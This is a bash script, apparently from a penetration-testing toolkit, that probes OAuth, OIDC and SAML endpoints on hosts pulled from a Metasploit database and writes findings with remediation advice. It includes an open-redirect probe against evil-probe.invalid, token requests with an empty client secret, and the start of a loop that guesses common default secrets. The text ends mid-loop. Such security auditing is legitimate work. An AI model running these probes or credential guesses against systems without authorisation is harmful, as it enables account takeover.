#!/bin/bash
# L1 ORC-NAV — read MRK:NAV_TOC first; fetch MRK ranges precisely (no default line count)
# L2 NAV:v1 → ./LOCAL-INDEX.md

# MRK:10_NAV_TOC — Section index | nav,toc,index | L5-57
# - MRK:10_ROOT    — ROOT CHECK                    | root,check,euid                    | L58-67  | ⚠ no-insert-before
# - MRK:10_CONF    — ENGAGEMENT CONFIGURATION      | conf,engagement,configuration      | L68-136 | ⚠ no-insert-before; propose-before-edit; read-toc-first
# - MRK:10_LOG     — COLOURS AND LOGGING           | log,colours,logging                | L137-158| ⚠ no-insert-before
# - MRK:10_ARGS    — ARGUMENT PARSING              | args,argument,parsing              | L159-204| ⚠ no-insert-before
# - MRK:10_DB      — MSF DB HELPERS                | db,msf,helpers,web,ports           | L205-260| ⚠ no-insert-before; propose-before-edit; read-toc-first
# - MRK:10_CONFIRM — SCOPE CONFIRMATION            | confirm,scope,confirmation         | L261-276| ⚠ no-insert-before; propose-before-edit
# - MRK:10_TARGETS — TARGET ASSEMBLY               | targets,target,assembly            | L277-313| ⚠ no-insert-before; read-toc-first
# - MRK:10_FIND    — FINDING WRITER                | find,finding,writer,jsonl,jq       | L314-339| ⚠ no-insert-before; read-toc-first
# - MRK:10_UTILS   — SHARED UTILITIES              | utils,shared,utilities,curl,proxy  | L340-400| ⚠ no-insert-before
# - MRK:10_PROF    — PROFILE SETUP                 | prof,profile,setup,quick,deep      | L401-436| ⚠ no-insert-before
# - MRK:10_T01     — T01 OAUTH/OIDC DISCOVERY      | t01,oauth,oidc,discovery,wellknown | L437-524| ⚠ read-toc-first
# - MRK:10_T02     — T02 OAUTH FLOW ATTACKS        | t02,oauth,flow,redirect,state,pkce | L525-630| ⚠ read-toc-first
# - MRK:10_T03     — T03 TOKEN ENDPOINT ABUSE      | t03,token,endpoint,introspect,scope| L631-722| ⚠ read-toc-first
# - MRK:10_T04     — T04 OIDC PROBES               | t04,oidc,jwks,nonce,issuer         | L723-804| ⚠ read-toc-first
# - MRK:10_T05     — T05 SAML DISCOVERY            | t05,saml,metadata,acs,sso          | L805-874| ⚠ read-toc-first
# - MRK:10_T06     — T06 SAML ASSERTION PROBES     | t06,saml,assertion,signature,wrap  | L875-972| ⚠ read-toc-first; deep-only
# - MRK:10_T07     — T07 SESSION MANAGEMENT        | t07,session,cookie,fixation,entropy| L973-1064|⚠ read-toc-first
# - MRK:10_T08     — T08 SSO LOGOUT & REVOCATION   | t08,logout,revoke,signout,redirect | L1065-1148|⚠ read-toc-first
# - MRK:10_T09     — T09 2FA/MFA BYPASS            | t09,mfa,2fa,otp,bypass,totp        | LXXXX-XXXX|⚠ read-toc-first
# - MRK:10_T10     — T10 ACCOUNT LOCKOUT & POLICY  | t10,lockout,password,bruteforce    | LXXXX-XXXX|⚠ read-toc-first
# - MRK:10_TRUN    — PER-TARGET DISPATCHER         | trun,target,dispatcher,test        | LXXXX-XXXX|⚠ no-insert-before; read-toc-first
# - MRK:10_MAIN    — MAIN ENTRY POINT              | main,entry,point,summary           | LXXXX-XXXX|⚠ no-insert-before; read-toc-first
# NAV-LEN: 24 entries | Integrity-hash: NEEDS-REINDEX | Last-indexed: 2026-07-01

# =============================================================================
# 10_auth_sso.sh — TechGuard. [VAPT-Advanced v1.0 — 2026-06-27]
# OAuth 2.0 / OIDC / SAML / SSO Attack Surface Testing
# Coverage: OAuth endpoint discovery, authorization flow attacks, token endpoint
#   abuse, OIDC probes (JWKS/nonce/issuer), SAML discovery + assertion probes,
#   session management (cookie attrs, fixation, entropy), SSO logout & revocation
# Profiles: quick | standard (default) | deep
# Consumes: MSF DB web hosts or --host/--targets; pre-seeded SSO vars in pt-orc.conf
# Produces: per-host evidence files + JSONL findings + markdown summary
# =============================================================================
# USAGE:
#   ./10_auth_sso.sh [OPTIONS]
#
# OPTIONS:
#   --targets <file>            File with host:port entries (one per line)
#   --host <IP:PORT>            Single target (repeatable)
#   --from-db                   Pull web hosts from MSF DB (default if no targets)
#   --tier <ghost|normal|loud>  Controls delays between requests
#   --token <bearer>            Bearer token for post-auth probes
#   --cookie <name=value>       Session cookie for logged-in probes
#   --profile <name>            quick|standard|deep (default: standard)
#   --oauth-client-id <id>      Known OAuth client ID for token endpoint tests
#   --oauth-client-secret <s>   Known OAuth client secret (default probes use empty/defaults)
#   --oauth-authorize-url <url> Full authorize URL (overrides discovered endpoint)
#   --saml-sso-url <url>        Known SAML SSO/ACS URL
#   --oidc-discovery-url <url>  Known OIDC discovery URL (overrides discovery probe)
#   --redirect-uri <uri>        Legitimate redirect_uri for flow tests
#   --intercept-proxy <url>     Proxy all curl requests through Burp/ZAP
#   --skip-test <N>             Skip test N (repeatable)
#   --only-test <N>             Run only test N (repeatable)
#   --yes                       Skip interactive scope confirmation
#   --dry-run                   Print commands without executing
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# =============================================================================
# MRK:10_ROOT — ROOT CHECK | root,check,euid | L58-67
# NAV-RULE: no-insert-before
# =============================================================================
if [[ "$EUID" -ne 0 ]] && [[ "${PTORC_ALLOW_NON_ROOT:-0}" != "1" ]]; then
    echo "[ERROR] This script must be run as root."
    echo "        Run: sudo $0 $*"
    exit 1
fi

# =============================================================================
# MRK:10_CONF — ENGAGEMENT CONFIGURATION | conf,engagement,configuration | L68-136
# NAV-RULE: no-insert-before; propose-before-edit; read-toc-first
# =============================================================================

[[ -f "${SCRIPT_DIR}/pt-orc.conf" ]] && source "${SCRIPT_DIR}/pt-orc.conf" \
    || echo "[WARN] pt-orc.conf not found in ${SCRIPT_DIR}"

[[ -f "${SCRIPT_DIR}/orc-common-lib.sh" ]] && source "${SCRIPT_DIR}/orc-common-lib.sh" \
    || echo "[WARN] orc-common-lib.sh not found — trail/notes writes disabled"

PROJ_SLUG="${PROJECT_NAME//[^A-Za-z0-9._-]/_}"
EVIDENCE_BASE="${SCAN_EVIDENCE_DIR:-${SCRIPT_DIR}/evidence}/${PROJ_SLUG}"

CURL_TIMEOUT="${CURL_TIMEOUT:-10}"
CURL_CONNECT=5

CURL_PROXY_ARGS=()

PROFILE="standard"
SKIP_TESTS=()
ONLY_TESTS=()

_T_ENABLED=()
for _i in $(seq 1 8); do _T_ENABLED[$_i]=1; done

TIER="${GLOBAL_TIER:-normal}"
FROM_DB=1
AUTO_YES=0
DRY_RUN=0

BEARER_TOKEN=""
COOKIE_HEADER=""

# SSO-specific configuration — overridable from pt-orc.conf or CLI
OAUTH_CLIENT_ID="${OAUTH_CLIENT_ID:-}"
OAUTH_CLIENT_SECRET="${OAUTH_CLIENT_SECRET:-}"
OAUTH_AUTHORIZE_URL="${OAUTH_AUTHORIZE_URL:-}"
SAML_SSO_URL="${SAML_SSO_URL:-}"
OIDC_DISCOVERY_URL="${OIDC_DISCOVERY_URL:-}"
SSO_REDIRECT_URI="${SSO_REDIRECT_URI:-}"

EXTRA_HOSTS=()
TARGETS_FILE=""

# Cross-test state (reset per target in test_target)
_SAML_DETECTED=0
_SAML_ACS_URL=""
_OAUTH_DETECTED=0
_OAUTH_TOKEN_URL=""
_OAUTH_AUTHORIZE_EP=""
_OIDC_DISCOVERY_DOC=""

tier_delay() { case "$1" in ghost) echo 2;; evasion) echo 3;; normal) echo 0;; loud) echo 0;; *) echo 0;; esac; }

TLS_PORTS="443 8443 4443 9443 10443"

# =============================================================================
# MRK:10_LOG — COLOURS AND LOGGING | log,colours,logging | L137-158
# NAV-RULE: no-insert-before
# =============================================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; BOLD='\033[1m'; NC='\033[0m'

_ts()  { date +'%Y%m%d_%H%M%S'; }
_now() { date +'%Y-%m-%d %H:%M:%S'; }

SESSION_TS="$(_ts)"
EV_TS="$(_ev_ts)"
[[ "$EVIDENCE_BASE" != /* ]] && EVIDENCE_BASE="$(pwd)/${EVIDENCE_BASE}"
mkdir -p "${EVIDENCE_BASE}/_sweep" "${SCRIPT_DIR}/working"
LOG_FILE="${EVIDENCE_BASE}/_sweep/auth_sso_${SESSION_TS}.log"
FINDINGS_FILE="${SCRIPT_DIR}/working/$(ev_fname "23-authsso-findings" "jsonl")"
: > "$FINDINGS_FILE"

log()     { local m="[$(_now)] $1";   echo -e "${BLUE}${m}${NC}" >&2;    echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_ok()  { local m="[$(_now)] ✓ $1"; echo -e "${GREEN}${m}${NC}" >&2;   echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_warn(){ local m="[$(_now)] ⚠ $1"; echo -e "${YELLOW}${m}${NC}" >&2;  echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_err() { local m="[$(_now)] ✗ $1"; echo -e "${RED}${m}${NC}" >&2;     echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_info(){ local m="[$(_now)]   $1"; echo -e "${CYAN}${m}${NC}" >&2;    echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_hi()  { local m="[$(_now)] ! $1"; echo -e "${MAGENTA}${m}${NC}" >&2; echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }

# =============================================================================
# MRK:10_ARGS — ARGUMENT PARSING | args,argument,parsing | L159-204
# NAV-RULE: no-insert-before
# =============================================================================

while [[ $# -gt 0 ]]; do
    case "$1" in
        --targets)              TARGETS_FILE="$2";           FROM_DB=0; shift 2 ;;
        --host)                 EXTRA_HOSTS+=("$2");          FROM_DB=0; shift 2 ;;
        --from-db)              FROM_DB=1;                               shift   ;;
        --tier)                 TIER="$2";                               shift 2 ;;
        --token)                BEARER_TOKEN="$2";                       shift 2 ;;
        --cookie)               COOKIE_HEADER="$2";                      shift 2 ;;
        --profile)              PROFILE="$2";                            shift 2 ;;
        --oauth-client-id)      OAUTH_CLIENT_ID="$2";                   shift 2 ;;
        --oauth-client-secret)  OAUTH_CLIENT_SECRET="$2";               shift 2 ;;
        --oauth-authorize-url)  OAUTH_AUTHORIZE_URL="$2";               shift 2 ;;
        --saml-sso-url)         SAML_SSO_URL="$2";          _SAML_DETECTED=1; shift 2 ;;
        --oidc-discovery-url)   OIDC_DISCOVERY_URL="$2";                shift 2 ;;
        --redirect-uri)         SSO_REDIRECT_URI="$2";                  shift 2 ;;
        --intercept-proxy)      CURL_PROXY_ARGS=("-x" "$2");            shift 2 ;;
        --skip-test)            SKIP_TESTS+=("$2");                      shift 2 ;;
        --only-test)            ONLY_TESTS+=("$2");                      shift 2 ;;
        --yes)                  AUTO_YES=1;                              shift   ;;
        --dry-run)              DRY_RUN=1;                               shift   ;;
        *) log_err "Unknown argument: $1"; exit 1 ;;
    esac
done

# =============================================================================
# MRK:10_DB — MSF DB HELPERS | db,msf,helpers,web,ports | L205-260
# NAV-RULE: no-insert-before; propose-before-edit; read-toc-first
# =============================================================================

MSF_DB_CONF="/usr/share/metasploit-framework/config/database.yml"
MSF_DB_USER="msf"; MSF_DB_NAME="msf"; MSF_DB_HOST="127.0.0.1"; MSF_DB_PORT="5432"
MSF_DB_PASS="${MSF_DB_PASS:-}"

parse_db_conf() {
    [[ -f "$MSF_DB_CONF" ]] || return
    MSF_DB_USER=$(grep -m1 'username:' "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" || echo "msf")
    MSF_DB_NAME=$(grep -m1 'database:'  "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" || echo "msf")
    MSF_DB_PORT=$(grep -m1 'port:'      "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" || echo "5432")
    MSF_DB_HOST="127.0.0.1"
    if [[ -z "${MSF_DB_PASS}" ]]; then
        MSF_DB_PASS=$(grep -m1 'password:' "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" 2>/dev/null || true)
    fi
    export MSF_DB_PASS
}

db_query() {
    PGPASSWORD="${MSF_DB_PASS:-}" psql -h "$MSF_DB_HOST" -p "$MSF_DB_PORT" \
        -U "$MSF_DB_USER" -d "$MSF_DB_NAME" -t -A -c "$1" 2>/dev/null || true
}

_get_web_hosts_csv() {
    local csv
    csv=$(find "${EVIDENCE_BASE}/_exports" -name 'services_tcp_*.csv' 2>/dev/null | sort | tail -1)
    [[ -z "$csv" ]] && return
    awk -F',' 'NR>1 && ($3=="80"||$3=="443"||$3=="8080"||$3=="8443"||$3=="4443") {print $1":"$3}' "$csv" 2>/dev/null || true
}

get_web_hosts_from_db() {
    local wid; wid=$(db_query \
        "SELECT id FROM workspaces WHERE name='${PROJECT_NAME}' LIMIT 1;")
    if [[ -z "$wid" ]]; then
        log_warn "get_web_hosts_from_db: workspace '${PROJECT_NAME}' not found — trying CSV fallback"
        _get_web_hosts_csv; return
    fi
    local web_ports="80,443,8080,8443,4443,8888,9443"
    local result
    result=$(db_query "SELECT host(h.address) || ':' || s.port \
              FROM services s JOIN hosts h ON s.host_id = h.id \
              WHERE h.workspace_id=${wid} \
              AND s.proto='tcp' AND s.state='open' \
              AND s.port IN (${web_ports}) \
              ORDER BY host(h.address), s.port;")
    if [[ -n "$result" ]]; then echo "$result"
    else
        log_warn "get_web_hosts_from_db: no web ports found — trying CSV fallback"
        _get_web_hosts_csv
    fi
}

# =============================================================================
# MRK:10_CONFIRM — SCOPE CONFIRMATION | confirm,scope,confirmation | L261-276
# NAV-RULE: no-insert-before; propose-before-edit
# =============================================================================

confirm_scope() {
    local hosts=("$@")
    log_warn "=== SCOPE CONFIRMATION — Auth/SSO Review v1.0 ==="
    log_warn "Profile: ${PROFILE} | Tier: ${TIER} | Tests: T01-T10"
    log_warn "Targets (${#hosts[@]}):"
    for h in "${hosts[@]}"; do log_warn "  → $h"; done
    [[ "${AUTO_YES:-0}" -eq 1 ]] && { log_ok "Auto-confirmed (--yes)"; return 0; }
    echo -en "${YELLOW}Proceed with Auth/SSO review against these targets? [y/N]: ${NC}" >&2
    read -r ans
    [[ "$ans" =~ ^[Yy]$ ]] || { log_err "Aborted by user."; exit 0; }
}

# =============================================================================
# MRK:10_TARGETS — TARGET ASSEMBLY | targets,target,assembly | L277-313
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

assemble_targets() {
    local -a all=()
    if [[ -n "$TARGETS_FILE" && -f "$TARGETS_FILE" ]]; then
        while IFS= read -r line; do
            line="${line%%#*}"; line="${line// /}"
            [[ -n "$line" ]] && all+=("$line")
        done < "$TARGETS_FILE"
    fi
    for h in "${EXTRA_HOSTS[@]+"${EXTRA_HOSTS[@]}"}"; do all+=("$h"); done
    if [[ "${FROM_DB:-0}" -eq 1 && "${#all[@]}" -eq 0 ]]; then
        parse_db_conf
        local db_hosts; db_hosts=$(get_web_hosts_from_db)
        if [[ -n "$db_hosts" ]]; then
            while IFS= read -r line; do [[ -n "$line" ]] && all+=("$line"); done <<< "$db_hosts"
        fi
    fi
    if [[ "${#all[@]}" -eq 0 ]]; then
        log_err "No targets found. Use --host, --targets, or --from-db with an active MSF workspace."
        exit 1
    fi
    printf '%s\n' "${all[@]}"
}

# =============================================================================
# MRK:10_FIND — FINDING WRITER | find,finding,writer,jsonl,jq | L314-339
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

_FIND_CTR=0

emit_finding() {
    local sev="$1" title="$2" desc="$3" rec="$4" ev_tag="$5"
    (( _FIND_CTR++ )) || true
    local ip_slug="${_CURRENT_IP//./_}"
    local fid="f-23-${ip_slug}-$(printf '%03d' "${_FIND_CTR}")"
    local ev_id="ev-23-${ip_slug}-$(printf '%03d' "${_FIND_CTR}")"
    local payload
    payload=$(printf '{"id":"%s","title":"%s","severity":"%s","phase":"10_auth_sso","evidence_ids":["%s"],"description":"%s","recommendation":"%s","retest_status":"n/a","residual_risk":""}' \
        "$fid" \
        "$(echo "$title" | sed 's/"/\\"/g')" \
        "$sev" \
        "${ev_tag:-$ev_id}" \
        "$(echo "$desc"  | sed 's/"/\\"/g')" \
        "$(echo "$rec"   | sed 's/"/\\"/g')")
    echo "$payload" >> "$FINDINGS_FILE"
    log_hi "FINDING [${sev^^}]: ${title}"
}

# =============================================================================
# MRK:10_UTILS — SHARED UTILITIES | utils,shared,utilities,curl,proxy | L340-400
# NAV-RULE: no-insert-before
# =============================================================================

_curl() {
    if [[ "${DRY_RUN:-0}" -eq 1 ]]; then
        log_info "  [DRY-RUN] curl -sk --max-time ${CURL_TIMEOUT} --connect-timeout ${CURL_CONNECT} ${CURL_PROXY_ARGS[*]+"${CURL_PROXY_ARGS[*]}"} $*"
        return 0
    fi
    curl -sk --max-time "$CURL_TIMEOUT" --connect-timeout "$CURL_CONNECT" \
        "${CURL_PROXY_ARGS[@]+"${CURL_PROXY_ARGS[@]}"}" "$@" 2>/dev/null || true
}

_curl_head() { _curl -I "$@"; }

_curl_loc() {
    _curl -o /dev/null -w "%{redirect_url}" -m 5 "$@" 2>/dev/null || true
}

_auth_args() {
    local -a args=()
    [[ -n "${BEARER_TOKEN:-}" ]] && args+=(-H "Authorization: Bearer ${BEARER_TOKEN}")
    [[ -n "${COOKIE_HEADER:-}" ]] && args+=(-H "Cookie: ${COOKIE_HEADER}")
    printf '%s\n' "${args[@]+"${args[@]}"}"
}

_scheme() {
    local port="$1"
    if echo "$TLS_PORTS" | grep -qw "$port"; then echo "https"; else echo "http"; fi
}

_save_ev() { local evfile="$1"; shift; echo "$@" >> "$evfile" 2>/dev/null || true; }

_tier_sleep() {
    local d; d=$(tier_delay "$TIER")
    [[ "$d" -gt 0 ]] && sleep "$d"
}

_test_skip() {
    local n="$1"
    if [[ "${#ONLY_TESTS[@]}" -gt 0 ]]; then
        local found=0
        for o in "${ONLY_TESTS[@]}"; do [[ "$o" == "$n" ]] && found=1; done
        [[ "$found" -eq 0 ]] && return 0
    fi
    for s in "${SKIP_TESTS[@]+"${SKIP_TESTS[@]}"}"; do [[ "$s" == "$n" ]] && return 0; done
    local enabled="${_T_ENABLED[$n]:-1}"
    [[ "$enabled" -eq 0 ]] && return 0
    return 1
}

# =============================================================================
# MRK:10_PROF — PROFILE SETUP | prof,profile,setup,quick,deep | L401-436
# NAV-RULE: no-insert-before
# =============================================================================

setup_profile() {
    log_info "Profile: ${PROFILE}"
    case "$PROFILE" in
        quick)
            # Discovery + session headers only
            for i in 2 3 4 6 8 9 10; do _T_ENABLED[$i]=0; done
            ;;
        standard)
            # All except deep-only SAML assertion probes (T06)
            _T_ENABLED[6]=0
            ;;
        deep)
            # All tests including SAML assertion probes, MFA bypass, lockout
            ;;
        *)
            log_warn "Unknown profile '${PROFILE}' — using standard"
            _T_ENABLED[6]=0
            ;;
    esac
    for s in "${SKIP_TESTS[@]+"${SKIP_TESTS[@]}"}"; do _T_ENABLED[$s]=0; done
}

# =============================================================================
# MRK:10_T01 — T01 OAUTH/OIDC DISCOVERY | t01,oauth,oidc,discovery,wellknown | L437-524
# NAV-RULE: read-toc-first
# =============================================================================

test_10_t01_discovery() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "sso-t01-discovery" "txt")"
    log "T01: OAuth/OIDC Endpoint Discovery — ${base_url}"
    _SUMMARY_OAUTH=0
    _OAUTH_DETECTED=0
    _OAUTH_AUTHORIZE_EP=""
    _OAUTH_TOKEN_URL=""
    _OIDC_DISCOVERY_DOC=""

    # High-value discovery endpoints
    local -a disc_eps=(
        "/.well-known/openid-configuration"
        "/.well-known/oauth-authorization-server"
        "/oauth/authorize"
        "/oauth/token"
        "/oauth/userinfo"
        "/oauth/callback"
        "/connect/authorize"
        "/connect/token"
        "/connect/userinfo"
        "/auth/realms/master/protocol/openid-connect/token"
        "/auth/realms/master/protocol/openid-connect/auth"
        "/api/oauth/authorize"
        "/api/oauth/token"
        "/sso/login"
        "/sso/oauth2/authorize"
        "/login/oauth/authorize"
        "/login/oauth/access_token"
        "/identity/connect/authorize"
        "/identity/connect/token"
        "/v1/oauth2/authorize"
        "/v1/oauth2/token"
    )

    local found_count=0
    {
        echo "[T01] OAuth/OIDC endpoint discovery — ${base_url}"
        echo "[T01] Date: $(date)"
        echo ""
    } > "$evfile"

    for ep in "${disc_eps[@]}"; do
        local code; code=$(_curl -o /dev/null -w "%{http_code}" "${base_url}${ep}" || true)
        if [[ "$code" =~ ^(200|301|302|400|401|403)$ ]]; then
            echo "[T01] FOUND ${ep} → HTTP ${code}" >> "$evfile"
            (( found_count++ )) || true
            _OAUTH_DETECTED=1
            # Capture discovery document if JSON returned at .well-known
            if [[ "$ep" == *"openid-configuration"* && "$code" == "200" ]]; then
                _OIDC_DISCOVERY_DOC=$(_curl "${base_url}${ep}" || true)
                echo "[T01] OIDC discovery doc captured (${#_OIDC_DISCOVERY_DOC} bytes)" >> "$evfile"
                # Extract token + authorize endpoints from discovery doc
                _OAUTH_TOKEN_URL=$(echo "$_OIDC_DISCOVERY_DOC" | grep -o '"token_endpoint":"[^"]*"' | cut -d'"' -f4 || true)
                _OAUTH_AUTHORIZE_EP=$(echo "$_OIDC_DISCOVERY_DOC" | grep -o '"authorization_endpoint":"[^"]*"' | cut -d'"' -f4 || true)
                [[ -n "$_OAUTH_TOKEN_URL"    ]] && echo "[T01] token_endpoint: ${_OAUTH_TOKEN_URL}" >> "$evfile"
                [[ -n "$_OAUTH_AUTHORIZE_EP" ]] && echo "[T01] authorization_endpoint: ${_OAUTH_AUTHORIZE_EP}" >> "$evfile"
            fi
            [[ -z "$_OAUTH_AUTHORIZE_EP" && "$ep" == *"authorize"* ]] && _OAUTH_AUTHORIZE_EP="${base_url}${ep}"
            [[ -z "$_OAUTH_TOKEN_URL"    && "$ep" == *"token"*     ]] && _OAUTH_TOKEN_URL="${base_url}${ep}"
        else
            echo "[T01] miss  ${ep} → HTTP ${code}" >> "$evfile"
        fi
    done

    # Override with CLI/conf-supplied values if present
    [[ -n "${OAUTH_AUTHORIZE_URL:-}" ]] && _OAUTH_AUTHORIZE_EP="$OAUTH_AUTHORIZE_URL"
    [[ -n "${OIDC_DISCOVERY_URL:-}"  ]] && _OAUTH_AUTHORIZE_EP="${OIDC_DISCOVERY_URL}"

    if [[ "$_OAUTH_DETECTED" -eq 1 ]]; then
        _SUMMARY_OAUTH=1
        emit_finding "info" \
            "OAuth/OIDC Endpoints Discovered (${ip}:${port})" \
            "Automated discovery identified ${found_count} OAuth/OIDC-related endpoints. The presence of authorization, token, and/or discovery endpoints confirms an OAuth 2.0/OIDC implementation that warrants dedicated flow testing." \
            "Restrict access to OAuth discovery and metadata endpoints to authorised clients. Ensure .well-known configurations do not expose internal infrastructure details." \
            "ev-23-${ip//./_}-t01-discovery"
        log_ok "T01: ${found_count} OAuth/OIDC endpoint(s) found"
    else
        log_ok "T01: No OAuth/OIDC endpoints detected — SSO tests will have limited coverage"
    fi
    _tier_sleep
}

# =============================================================================
# MRK:10_T02 — T02 OAUTH FLOW ATTACKS | t02,oauth,flow,redirect,state,pkce | L525-630
# NAV-RULE: read-toc-first
# =============================================================================

test_10_t02_oauth_flow() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "sso-t02-flow" "txt")"
    log "T02: OAuth Authorization Flow Attacks — ${base_url}"
    _SUMMARY_FLOW=0

    local auth_ep="${_OAUTH_AUTHORIZE_EP:-${base_url}/oauth/authorize}"
    local client_id="${OAUTH_CLIENT_ID:-testclient}"
    local legit_redirect="${SSO_REDIRECT_URI:-${base_url}/callback}"

    {
        echo "[T02] OAuth flow attacks — ${auth_ep}"
        echo "[T02] Date: $(date)"
        echo ""
    } > "$evfile"

    # ── Probe 1: Open redirect via redirect_uri to external domain ────────────
    local code loc
    code=$(_curl -o /dev/null -w "%{http_code}" \
        "${auth_ep}?response_type=code&client_id=${client_id}&redirect_uri=https://evil-probe.invalid&scope=openid" || true)
    loc=$(_curl_loc \
        "${auth_ep}?response_type=code&client_id=${client_id}&redirect_uri=https://evil-probe.invalid&scope=openid" || true)
    echo "[T02] redirect_uri=https://evil-probe.invalid → HTTP ${code} | Location: ${loc}" >> "$evfile"
    if echo "$loc" | grep -qi "evil-probe.invalid"; then
        _SUMMARY_FLOW=1
        emit_finding "high" \
            "OAuth Open Redirect — Unvalidated redirect_uri Accepted (${ip}:${port})" \
            "The authorization endpoint accepted an arbitrary redirect_uri pointing to an attacker-controlled domain. An attacker can craft a malicious authorize URL; a legitimate user following it will have their authorization code or token delivered to the attacker's server." \
            "Enforce a strict allowlist of pre-registered redirect_uri values. Reject any redirect_uri not exactly matching a registered value. Implement RFC 6819 redirect_uri validation including scheme and host comparison." \
            "ev-23-${ip//./_}-t02-redirect-uri"
    fi
    _tier_sleep

    # ── Probe 2: Missing state parameter — CSRF risk ──────────────────────────
    code=$(_curl -o /dev/null -w "%{http_code}" \
        "${auth_ep}?response_type=code&client_id=${client_id}&redirect_uri=${legit_redirect}&scope=openid" || true)
    echo "[T02] missing state= → HTTP ${code}" >> "$evfile"
    # A well-configured IdP should reject the request (400) or at least warn.
    # If it returns 200 or 302 without state enforcement, that's a CSRF exposure.
    if [[ "$code" =~ ^(200|302|303)$ ]]; then
        _SUMMARY_FLOW=1
        emit_finding "medium" \
            "OAuth CSRF — Missing state Parameter Not Enforced (${ip}:${port})" \
            "The authorization endpoint processed a request with no state parameter without returning an error. The state parameter is the primary CSRF defence in OAuth 2.0 flows. Without it, an attacker can trick an authenticated user into initiating an OAuth flow that grants the attacker access to the victim's account (authorization code injection / CSRF login attack)." \
            "Require a cryptographically random state parameter on every /authorize request. Validate the returned state value on the callback before accepting the code. Use PKCE as an additional layer of protection for public clients." \
            "ev-23-${ip//./_}-t02-state"
    fi
    _tier_sleep

    # ── Probe 3: PKCE enforcement — downgrade attack ──────────────────────────
    code=$(_curl -o /dev/null -w "%{http_code}" \
        "${auth_ep}?response_type=code&client_id=${client_id}&redirect_uri=${legit_redirect}&scope=openid&state=probe_state_123" || true)
    echo "[T02] no PKCE (no code_challenge) → HTTP ${code}" >> "$evfile"
    # A PKCE-enforcing server should return 400/invalid_request for public clients without code_challenge
    if [[ "$code" =~ ^(200|302|303)$ ]]; then
        emit_finding "medium" \
            "OAuth PKCE Not Enforced on Authorization Request (${ip}:${port})" \
            "The authorization endpoint accepted a request from a public client without a code_challenge parameter. PKCE (RFC 7636) prevents authorization code interception attacks. Without enforcement an attacker who intercepts the authorization code can exchange it for tokens without knowing the original code_verifier." \
            "Require code_challenge and code_challenge_method for all public clients. Enforce PKCE on the token endpoint by requiring a matching code_verifier. Reject authorization requests from public clients that omit PKCE parameters." \
            "ev-23-${ip//./_}-t02-pkce"
    fi
    _tier_sleep

    # ── Probe 4: Implicit flow downgrade (response_type=token) ───────────────
    code=$(_curl -o /dev/null -w "%{http_code}" \
        "${auth_ep}?response_type=token&client_id=${client_id}&redirect_uri=${legit_redirect}&scope=openid&state=probe_state_456" || true)
    echo "[T02] response_type=token (implicit flow) → HTTP ${code}" >> "$evfile"
    if [[ "$code" =~ ^(200|302|303)$ ]]; then
        emit_finding "medium" \
            "OAuth Implicit Flow Supported — Token Exposure Risk (${ip}:${port})" \
            "The authorization endpoint accepted response_type=token, indicating support for the OAuth 2.0 implicit flow. The implicit flow is deprecated (OAuth 2.1) as it delivers access tokens directly in URI fragments, making them visible in browser history, referrer headers, and server logs. Modern applications should use the authorization code flow with PKCE." \
            "Disable the implicit flow (response_type=token and response_type=id_token). Migrate all clients to authorization code flow with PKCE. Update OAuth server configuration to reject implicit flow grant type." \
            "ev-23-${ip//./_}-t02-implicit"
    fi
    _tier_sleep

    [[ "${_SUMMARY_FLOW:-0}" -eq 0 ]] && log_ok "T02: No critical OAuth flow vulnerabilities detected in automated probes"
}

# =============================================================================
# MRK:10_T03 — T03 TOKEN ENDPOINT ABUSE | t03,token,endpoint,introspect,scope | L631-722
# NAV-RULE: read-toc-first
# =============================================================================

test_10_t03_token_abuse() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "sso-t03-token" "txt")"
    log "T03: Token Endpoint Abuse — ${base_url}"
    _SUMMARY_TOKEN=0

    local token_ep="${_OAUTH_TOKEN_URL:-${base_url}/oauth/token}"
    local client_id="${OAUTH_CLIENT_ID:-testclient}"

    {
        echo "[T03] Token endpoint abuse — ${token_ep}"
        echo "[T03] Date: $(date)"
        echo ""
    } > "$evfile"

    # ── Probe 1: client_credentials with empty secret ─────────────────────────
    local resp code
    resp=$(_curl -s -X POST "$token_ep" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "grant_type=client_credentials&client_id=${client_id}&client_secret=" || true)
    code=$(_curl -o /dev/null -w "%{http_code}" -X POST "$token_ep" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "grant_type=client_credentials&client_id=${client_id}&client_secret=" || true)
    echo "[T03] client_credentials empty secret → HTTP ${code}" >> "$evfile"
    echo "[T03] Response: ${resp:0:300}" >> "$evfile"
    if echo "$resp" | grep -qi "access_token"; then
        _SUMMARY_TOKEN=1
        emit_finding "critical" \
            "OAuth Token Endpoint — client_credentials Accepted with Empty Secret (${ip}:${port})" \
            "The token endpoint issued an access_token in response to a client_credentials grant with an empty client_secret. This allows any party that knows a valid client_id to obtain access tokens without authentication, completely bypassing OAuth client authentication." \
            "Enforce strong client authentication on the token endpoint. Reject client_credentials grants with empty, null, or missing secrets. Implement client secret rotation and store secrets using secure hashing. Consider mTLS or private_key_jwt client authentication for sensitive clients." \
            "ev-23-${ip//./_}-t03-empty-secret"
    fi
    _tier_sleep

    # ── Probe 2: client_credentials with common default secrets ──────────────
    local -a default_secrets=("password" "secret" "admin" "test" "changeme" "client_secret" "12345" "oauth")
    for sec in "${default_secrets[@]}"; do
